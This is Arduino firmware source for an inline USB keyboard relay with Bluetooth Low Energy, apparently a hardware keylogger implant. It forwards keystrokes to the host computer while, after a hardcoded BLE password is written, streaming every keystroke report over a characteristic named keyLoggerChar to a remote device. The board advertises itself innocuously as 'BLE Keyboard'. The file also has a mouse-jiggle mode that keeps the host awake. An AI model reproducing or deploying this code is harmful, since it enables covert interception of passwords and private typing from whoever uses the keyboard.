/*
 * Receive ASCII text from Serial1 and convert to USB HID report.
 * Send HID report out USB interface.
 * Maps out keystrokes and sends out data over ble when a central device is connected
 * Added a BLE password Characteristic to trigger transmission of keystrokes (10/8/20, Jonathan Fischer)
 *   - keystroke and password data overwritten to empty data when not transmitting
 * Changing how keystrokes are read and relayed over BLE - Phase 1C (10/9/20, Jonathan Fischer)
 *   - a lag was discovered when the nano was transmitting keystrokes to the xbee so connection was moved to a second nano
 *   - added parameters for insomnia mode and mode selection, renamed transmitChar to passwordChar to better reflect function
 *   - mode selection needs to be implemented and activation password should possibly control insomnia mode as well
 *   - one think to note for future use is if power is supplied to the keyboards in vdi mode, we may consider trying to store some modes in eeprom
 *     so they don't need to be reset upon power down
 */

#include <Keyboard.h>
#include <ArduinoBLE.h>
#include <Mouse.h>

///Setup BLE parameters///
BLEService keyboardService("C103");
BLECharacteristic passwordChar("0110", BLERead | BLEWrite, 20);
BLECharacteristic keyLoggerChar("0111", BLERead | BLEIndicate, 20);
BLECharacteristic mouseChar("0101", BLEWrite, 8);
BLECharacteristic modeChar("0100", BLEWrite, 20);


//password variables for tx of keystrokes
bool tx = false;
char passdata[20];
char emptydata[20];

//variables for insomnia mode + emptydata above to clear buffer
char mousedata[8];
bool insomnia = false;

#if 0
/* Arduino Zero */
#define SERDEBUG  Serial1
#define USBEvent  Serial
#endif

#if 1
/* Trinket M0 or 32u4 */
#define SERDEBUG  Serial
#define USBEvent  Serial1
#endif

char aLine[81];
uint8_t aLine_count = 0;

void setup()
{
#ifdef SERDEBUG
  SERDEBUG.begin(115200);
#endif
  USBEvent.begin(115200);
  aLine_count = 0;

    //begin BLE code here
    // begin initialization
  if (!BLE.begin()) {
    Serial.println("starting BLE failed!");

    while (1);
  }

  //
  BLE.setLocalName("BLE Keyboard");
  BLE.setDeviceName("Keyboard");
  BLE.setAdvertisedService(keyboardService);
  keyboardService.addCharacteristic(modeChar);
  keyboardService.addCharacteristic(mouseChar);
  keyboardService.addCharacteristic(passwordChar);
  keyboardService.addCharacteristic(keyLoggerChar);
  BLE.addService(keyboardService);
  BLE.advertise();
}

uint8_t params2bin(char *buf, uint8_t *outbuf, uint8_t outbuf_len)
{
  char *p;
  uint8_t outbuf_count = 0;

  memset(outbuf, 0, outbuf_len);
  p = strtok(buf, ",");
  while (p != NULL && outbuf_count < outbuf_len) {
    *outbuf++ = strtoul(p, NULL, 10);
    outbuf_count++;
    p = strtok(NULL, ",");
  }
  return outbuf_count;
}

void loop()
{  
BLEDevice central = BLE.central();

getInsomnia();

if (insomnia) {
  Mouse.move(1, 0);
  Mouse.move(-1,0);
  Mouse.end();
}

//Check activation password
if (passwordChar.written()) {
  Serial.println("Write detected");
  passwordChar.readValue(passdata, 20);
  String password = passdata;
  Serial.print("Password: ");
  Serial.println(password);
  if (password == "8ajI=6otrlb@l?lp"){
    Serial.println("Password accepted");
    tx = true;
    for (byte i = 0; i < sizeof(passdata); i++) passdata[i] = emptydata[i];
    passwordChar.writeValue(passdata,20);
  }
  else {
    if (tx) {
      keyLoggerChar.writeValue(emptydata,20);
    }
    tx = false;
  }
}

#ifdef SERDEBUG
  if (SERDEBUG.available() > 0) {
    char c = SERDEBUG.read();
    USBEvent.write(c);
  }
#endif

  if (USBEvent.available() > 0) {
    char c = USBEvent.read();
#ifdef SERDEBUG
    SERDEBUG.print("c 0x"); SERDEBUG.println(c, HEX);
#endif
    if (c == '\n' || aLine_count >= sizeof(aLine)) {
      aLine[aLine_count] = '\0';
#ifdef SERDEBUG
      SERDEBUG.println(aLine);
#endif
      char command = aLine[0];
      uint8_t rawdata[8];
      uint8_t raw_len = params2bin(aLine+2, rawdata, sizeof(rawdata));
      aLine_count = 0;
      String message = "";
      if (raw_len > 0) {
        switch (command) {
          // Keyboard HID report
          case 'K':
          case 'k':
            if (raw_len != 8) break;
            /*if (rawdata[0] != 0) {
              message.concat(getMod(byte(rawdata[0])));
            }
            for (byte i = 1; i < raw_len; i++){
              if (message.length() > 0){
                message.concat(" ");
              }
              message.concat(getKey(byte(rawdata[i])));
            }
            Serial.print("Key press: ");
            Serial.println(message);
            if (tx) {
              char keyArray[20];
              message.toCharArray(keyArray,20);
              keyLoggerChar.writeValue(keyArray);
            }*/
            HID().SendReport(2, rawdata, sizeof(KeyReport));
            if (tx) {
              char keyArray[20];
              sprintf(keyArray, "%d,%d,%d,%d,%d,%d,%d,%d", rawdata[0], rawdata[1], rawdata[2], rawdata[3], rawdata[4], rawdata[5], rawdata[6], rawdata[7]);
              Serial.println(keyArray);
              keyLoggerChar.writeValue(keyArray);
            }
            break;
            // Mouse HID report
          case 'M':
          case 'm':
            if (raw_len != 4) break;
            HID().SendReport(1, rawdata, 4);
            break;
            // Joystick????
          case 'J':
          case 'j':
            break;
          default:
            break;
        }
      }
    }
    else {
      aLine[aLine_count++] = c;
    }
  }
}

String getMod (byte m){
  String output = "";
  if (m > 64){
    output.concat("RtAlt ");
    m = m - 64;
  }
  else if (m == 64){
    output.concat("RAlt");
    m = m - 64;
  }
  if (m > 32){
    output.concat("RtShft ");
    m = m - 32;
  }
  else if (m == 32) {
    output.concat("RtShft");
    m = m - 32;
  }
  if (m > 16) {
    output.concat("RtCtrl ");
    m = m - 16;
  }
  else if (m == 16){
    output.concat("RtCtrl");
    m = m - 16;
  }
  if (m > 8) {
    output.concat("LtGUI ");
    m = m - 8;
  }
  else if (m == 8) {
    output.concat("LtGUI");
    m = m - 8;
  }
  if (m > 4) {
    output.concat("LtAlt ");
    m = m - 4;
  }
  else if (m == 4) {
    output.concat("LtAlt");
    m = m -4;
  }
  if (m > 2) {
    output.concat("LtShft ");
    m = m - 2;
  }
  else if (m == 2) {
    output.concat("LtShft");
    m = m - 2;
  }
  if (m == 1) {
    output.concat("LtCtrl");
  }
  return output;
}

String getKey (byte k){
  switch (k){
    case 0:
      return String("");
    case 1:
      return "Key1NotFound";
    case 2:
      return "Key2NotFound";
    case 3:
      return "Key3NotFound";
    case 4:
      return "a";
    case 5:
      return "b";
    case 6:
      return "c";
    case 7:
      return "d";
    case 8:
      return "e";
    case 9:
      return "f";
    case 10:
      return "g";
    case 11:
      return "h";
    case 12:
      return "i";
    case 13:
      return "j";
    case 14:
      return "k";
    case 15:
      return "l";
    case 16:
      return "m";
    case 17:
      return "n";
    case 18:
      return "o";
    case 19:
      return "p";
    case 20:
      return "q";
    case 21:
      return "r";
    case 22:
      return "s";
    case 23:
      return "t";
    case 24:
      return "u";
    case 25:
      return "v";
    case 26:
      return "w";
    case 27:
      return "x";
    case 28:
      return "y";
    case 29:
      return "z";
    case 30:
      return "1";
    case 31:
      return "2";
    case 32:
      return "3";
    case 33:
      return "4";
    case 34:
      return "5";
    case 35:
      return "6";
    case 36:
      return "7";
    case 37:
      return "8";
    case 38:
      return "9";
    case 39:
      return "0";
    case 40:
      return "Enter";
    case 41:
      return "Esc";
    case 42:
      return "BkSpc";
    case 43:
      return "Tab";
    case 44:
      return "SpcBar";
    case 45:
      return "-";
    case 46:
      return "=";
    case 47:
      return "[";
    case 48:
      return "]";
    case 49:
      return "'\'";
    case 50:
      return "Key50NotMapped";
    case 51:
      return ";";
    case 52:
      return "'";
    case 53:
      return "`";
    case 54:
      return ",";
    case 55:
      return ".";
    case 56:
      return "/";
    case 57:
      return "CapsLck";
    case 58:
      return "F1";
    case 59:
      return "F2";
    case 60:
      return "F3";
    case 61:
      return "F4";
    case 62:
      return "F5";
    case 63:
      return "F6";
    case 64:
      return "F7";
    case 65:
      return "F8";
    case 66:
      return "F9";
    case 67:
      return "F10";
    case 68:
      return "F11";
    case 69:
      return "F12";
    case 70:
      return "PrntScrn";
    case 71:
      return "ScrnLck";
    case 72:
      return "Key72NotMapped";
    case 73:
      return "Ins";
    case 74:
      return "Home";
    case 75:
      return "PgUp";
    case 76:
      return "Del";
    case 77:
      return "End";
    case 78:
      return "PgDn";
    case 79:
      return "ArwR";
    case 80:
      return "ArwL";
    case 81:
      return "ArwD";
    case 82:
      return "ArwU";
    case 83:
      return "NumLck";
    case 84:
      return "Key84NotMapped";
    case 85:
      return "Key85NotMapped";
    case 86:
      return "Key86NotMapped";
    case 87:
      return "Key87NotMapped";
    case 88:
      return "Key88NotMapped";
    case 89:
      return "Key89NotMapped";
    case 90:
      return "Key90NotMapped";
    case 91:
      return "Key91NotFound";
    case 92:
      return "Key92NotFound";
    case 93:
      return "Key93NotFound";
    case 94:
      return "Key94NotFound";
    case 95:
      return "Key95NotFound";
    case 96:
      return "Key96NotFound";
    case 97:
      return "Key97NotFound";
    case 98:
      return "Key98NotFound";
    case 99:
      return "Key99NotFound";
    case 100:
      return "Key100NotFound";
    case 101:
      return "RtGUI";
    default:
      return "KeyNotFound";
      break;
  }
}

void getInsomnia(){
  if (mouseChar.written()){
    Serial.println("Mouse Write Detected");
    mouseChar.readValue(mousedata,8);
    String mouse = mousedata;
    Serial.print("mouse: ");
    Serial.println(mouse);
    if (mouse == "Caffeine"){
      Serial.println("Insomnia mode active");
      insomnia = true;
    }
    else {
      Serial.println("Sleep mode is now allowed");
      insomnia = false;
    }
  }
}
